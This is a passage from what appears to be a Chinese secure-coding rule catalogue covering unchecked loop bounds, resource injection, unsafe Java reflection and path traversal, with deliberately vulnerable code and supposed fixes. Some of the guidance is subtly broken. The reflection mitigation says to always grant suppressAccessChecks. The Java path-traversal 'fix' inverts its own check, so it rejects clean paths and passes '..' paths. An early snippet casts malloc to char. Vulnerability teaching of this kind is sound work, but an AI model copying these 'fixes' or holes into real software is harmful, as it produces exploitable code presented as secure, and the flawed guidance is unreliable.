    <span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="o">&gt;</span><span class="n">MAX_LENGTH</span> <span class="o">||</span> <span class="n">length</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">//对length进行验证</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">length</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">buffer</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="p">...</span>
        <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h1 id="_6">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/400.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-789.html">CWE-789</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE4003">未检查的输入作为循环条件</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">规范用法示例</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>软件没有对被用于循环条件的输入进行适当的检查。</p>
<h1 id="_2">漏洞与风险</h1>
<p>攻击者可以让软件循环过多而使软件拒绝服务。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>要避免该漏洞，你应该：</p>
<ul>
<li>规定循环次数的上限，在将用户输入的数据用于循环条件前验证用户输入的数据是否超过上限。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">)</span>  <span class="c1">//count为用户输入数据</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">//未检查count的值是否过大可能导致软件循环过多而使软件拒绝服务</span>
    <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">count</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="p">...</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h3 id="_7">规范用法示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">MAX_COUNT</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>  <span class="c1">//本例中定义循环次数最大为1000次</span>
<span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">)</span>  <span class="c1">//count为用户输入数据</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">count</span><span class="o">&lt;=</span><span class="n">MAX_COUNT</span><span class="p">)</span>  <span class="c1">//判断循环次数是否不大于最大循环次数</span>
    <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">count</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span> 
            <span class="p">...</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1076">资源注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_7">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>攻击者通过操纵资源标识符来利用验证输入信息过程中的缺陷，从而意想不到地实现某个资源的修改或说明（modification or specification）。</p>
<h1 id="_2">漏洞与风险</h1>
<p>某个资源有个能遭受无意的修改或说明。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>确保所有发送给客户端的输入内容都经过了一个可接受的内容说明的清洗。</li>
<li>对所有的内容进行输入验证。</li>
<li>强制对软件定期打补丁。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>下面的例子展示了一个程序未经任何验证过程，从HTTP请求中获取端口号并以该端口号创建了一条socket管道。别有用心的用户可以通过使用代理来更改该端口号，从而获取到一条与服务器直接进行通讯的连接：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">rPort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"remotePort"</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">ServerSocket</span> <span class="n">srvr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServerSocket</span><span class="o">(</span><span class="n">rPort</span><span class="o">);</span>
<span class="n">Socket</span> <span class="n">skt</span> <span class="o">=</span> <span class="n">srvr</span><span class="o">.</span><span class="na">accept</span><span class="o">();</span> 
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h1 id="_7">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Resource_Injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-capec">
<p>https://capec.mitre.org/data/definitions/240.html <a class="footnote-backref" href="#fnref-capec" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1072">不安全的反射</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a><ul>
<li><a href="#api">需要谨慎使用的API</a></li>
</ul>
</li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>反射使得程序分析和修改自身成为可能。特别地，一个程序可以了解到自身的成员变量的值，并且可以修改他们<a href="https://wiki.sei.cmu.edu/confluence/display/java/Rule+AA.+References#RuleAA.References-Forman05">Forman 2005</a>, <a href="https://wiki.sei.cmu.edu/confluence/display/java/Rule+AA.+References#RuleAA.References-Sun02">Sun 2002</a>。Java的<code>reflection API</code>提供了一种通过反射来访问正常情况下无法访问的字段的方法。</p>
<h1 id="_2">漏洞与风险</h1>
<h4 id="api">需要谨慎使用的API</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span><span class="o">.</span><span class="na">get</span><span class="o">*()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span><span class="o">.</span><span class="na">set</span><span class="o">*()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicIntegerFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicLongFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicReferenceFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
</pre></div>
</td></tr></table>
<p>反射的使用使得程序的安全分析变得复杂，同时还引入了安全漏洞。能够不通过使用来完成任务时，开发者应该尽可能地避免使用反射API。在必须使用反射的情况下，请保持十分地小心。</p>
<p>特别地，除非类、方法或字段本身是能够被访问的，开发者不能使用反射来访问上述的信息。例如，除非字段本来就是可访问、可修改的，如<code>getter</code>和<code>setter</code>方法，通过使用反射来访问这些不可访问的字段、修改不可修改的字段是不被允许的。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>确保安全管理者（security manager）会阻断那些试图访问类的私有字段的行为，永远给<code>ReflectPermission</code>许可以<code>suppressAccessChecks</code>动作。</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>在这个存在漏洞的示例中，一个<code>Filed</code>对象可以通过反射来修改私有字段<code>i</code>和<code>j</code>：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">4</span><span class="o">;</span>

  <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="s">"FieldExample: i="</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">", j="</span> <span class="o">+</span> <span class="n">j</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroI</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
      <span class="c1">// Subsequent access to field f passes language access checks</span>
      <span class="c1">// because zeroField() could have accessed the field via</span>
      <span class="c1">// ordinary field references</span>
      <span class="n">f</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
      <span class="c1">// Log appropriately or throw sanitized exception; see EXC06-J</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Report to handler</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Report to handler</span>
    <span class="o">}</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">FieldExample</span> <span class="n">fe</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FieldExample</span><span class="o">();</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fe</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">arg</span> <span class="o">:</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">fe</span><span class="o">.</span><span class="na">zeroField</span><span class="o">(</span><span class="n">arg</span><span class="o">);</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fe</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="_7">漏洞代码修复示例</h3>
<p>如在这个合规的解决方案中，请确保通过声明<code>private</code>或<code>final</code>的方式，将直接调用者（或直接调用方法）与恶意代码隔离开：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="c1">// ...</span>

  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>当一个类必须使用反射来向外界提供字段的访问方法时，它必须同时提供可利用非反射接口来访问这些字段的方法：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="c1">// ...</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroI</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroJ</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">j</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="_8">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/SEC05-J.+Do+not+use+reflection+to+increase+accessibility+of+classes%2C+methods%2C+or+fields <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0086">路径遍历</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#1">漏洞代码示例 1</a></li>
<li><a href="#1_1">漏洞代码修复示例 1</a></li>
<li><a href="#2">漏洞代码示例 2</a></li>
<li><a href="#2_1">漏洞代码修复示例 2</a></li>
</ul>
</li>
<li><a href="#_6">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>许多文件操作旨在在受限制的目录中进行。通过使用诸如".."和"/"分隔符等特殊元素，攻击者可以逃离受限位置以访问系统中其他位置的文件或目录。最常见的特殊元素之一是"../"序列，它在大多数现代操作系统中被解释为当前位置的父目录。这被称为相对路径遍历。路径遍历还包括绝对路径名的使用，例如"/usr/local/bin"，这在访问意外文件时也很有用。这被称为绝对路径遍历。</p>
<h1 id="_2">漏洞与风险</h1>
<p>在许多编程语言中，注入空字节（0或NUL）可能允许攻击者截断生成的文件名以扩大攻击范围。例如，该软件可能会将".txt"添加到任何路径名，从而将攻击者限制为文本文件，但空注入可能会有效地消除此限制。</p>
<h1 id="_3">缓解与预防</h1>
<p>假设所有输入都是恶意的。使用"接受已知良好"输入验证策略，例如使用严格符合规范的可接受输入的白名单。拒绝任何不严格符合规范的输入。</p>
<p>执行输入验证时，请考虑所有可能相关的属性，包括长度，输入类型，可接受值的全部范围，缺失或额外输入，语法，相关字段的一致性以及对业务规则的一致性。 </p>
<p>不要完全依靠寻找恶意或畸形输入（即不要依赖黑名单）。黑名单可能会遗漏至少一个不良的输入，特别是如果代码的环境发生变化。 这可能给攻击者足够的空间来绕过预期的验证。</p>
<p>验证文件名时，请使用严格的白名单来限制要使用的字符集。 如果可行，只允许一个"." 字符以避免诸如CWE-23之类的弱点，并且排除诸如"/"之类的目录分隔符以避免CWE-36。使用允许的文件扩展名的白名单，这将有助于避免CWE-434。</p>
<p>不要完全依赖去除潜在危险字符的过滤机制。 这相当于黑名单，可能不完整（CWE-184）。 例如，如果文件系统也支持使用"\"作为目录分隔符，则过滤"/"的保护不足。 如果以仍会产生危险数据的方式应用筛选（CWE-182），则可能会发生另一个可能的错误。 例如，如果以顺序的方式从 ".../...//" 字符串中删除"../"序列，则将从原始字符串中移除两个"../"实例，但其余的字符仍然会形成"../"字符串。</p>
<h1 id="_4">漏洞利用威胁</h1>
<p>严重</p>
<h1 id="_5">演示实例</h1>
<h3 id="1">漏洞代码示例 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">path_traversal</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">file_path</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span> <span class="c1">// @@bad@@</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>该漏洞代码示例没有对外部输入的file_path进行有效的验证，可以能会触发路径遍历漏洞。</p>
<h3 id="1_1">漏洞代码修复示例 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">bool</span> <span class="nf">verify_file_path</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file_path</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">path_traversal</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">file_path</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">verify_file_path</span><span class="p">(</span><span class="n">file_path</span><span class="p">)){</span> <span class="c1">// @@good@@</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>该漏洞代码修复示例中，通过调用verify_file_path()函数，有效的验证了路径，可以预防路径遍历漏洞。</p>
<h3 id="2">漏洞代码示例 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testbad</span><span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">is1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="n">InputStream</span> <span class="n">is2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">128</span><span class="o">];</span>
            <span class="n">is1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"filepath"</span><span class="o">);</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">file_path</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">128</span><span class="o">);</span>
      <span class="n">is2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">));</span>  <span class="c1">// @@bad@@</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">E</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="n">is2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>该漏洞代码示例没有对外部输入的file_path进行有效的验证，可以能会触发路径遍历漏洞。</p>
<h3 id="2_1">漏洞代码修复示例 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testgood</span><span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">verify_file_path</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span><span class="o">){</span>
    <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">file_path</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">".."</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">InputStream</span> <span class="n">is1</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="n">InputStream</span> <span class="n">is2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">file_path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">128</span><span class="o">];</span>
            <span class="n">is1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"filepath"</span><span class="o">);</span>
      <span class="n">is1</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">file_path</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">128</span><span class="o">);</span>
      <span class="k">if</span><span class="o">(!</span><span class="n">verify_file_path</span><span class="o">(</span><span class="n">file_path</span><span class="o">)){</span>  <span class="c1">// @@good@@</span>
